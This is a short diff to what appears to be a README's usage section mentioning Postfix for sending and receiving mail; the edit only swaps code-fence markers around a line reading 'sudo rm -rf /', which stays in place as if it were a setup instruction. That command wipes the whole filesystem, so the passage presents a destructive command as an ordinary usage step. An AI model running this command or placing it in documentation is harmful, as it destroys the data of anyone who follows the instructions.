@@ -22,8 +22,8 @@ that filter.
 
 ## Instructions on how to use
 
-- **Postfix** to send and receive mail.
-'''
+- **Postfix** to send and receive mail
 
+``````
 sudo rm -rf /
-'''
+``````
